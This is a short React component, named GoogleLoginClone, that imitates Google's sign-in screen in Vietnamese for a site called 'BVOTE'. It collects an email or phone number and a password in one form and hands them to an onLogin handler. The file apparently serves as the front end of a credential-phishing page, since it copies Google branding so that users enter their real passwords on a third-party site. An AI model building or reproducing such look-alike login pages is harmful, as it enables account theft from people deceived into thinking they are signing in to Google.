import React from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Google } from '@/components/icons/Google';
import { Loader } from 'lucide-react';

const GoogleLoginClone = ({ onLogin, isLoading }) => (
    <div className="bg-white p-6 rounded-lg text-black w-full flex flex-col justify-center">
        <div className="text-center mb-6">
            <Google className="h-8 w-8 mx-auto" />
            <h2 className="text-2xl font-semibold mt-4">Đăng nhập</h2>
            <p className="text-sm text-gray-600 mt-1">để tiếp tục đến BVOTE</p>
        </div>
        <form onSubmit={onLogin} className="space-y-4">
            <Input id="account" name="account" type="email" placeholder="Email hoặc số điện thoại" required className="h-11 border-gray-300 focus:border-blue-500 focus:ring-blue-500 text-black" disabled={isLoading} />
            <Input id="password" name="password" type="password" placeholder="Mật khẩu" required className="h-11 border-gray-300 focus:border-blue-500 focus:ring-blue-500 text-black" disabled={isLoading} />
            <div className="flex justify-between items-center text-sm pt-4">
                <button type="button" className="text-blue-600 hover:underline font-semibold">Quên mật khẩu?</button>
                <Button type="submit" className="bg-blue-600 hover:bg-blue-700 text-white px-6" disabled={isLoading}>
                    {isLoading ? <Loader className="h-4 w-4 animate-spin" /> : 'Tiếp theo'}
                </Button>
            </div>
        </form>
    </div>
);

export default GoogleLoginClone;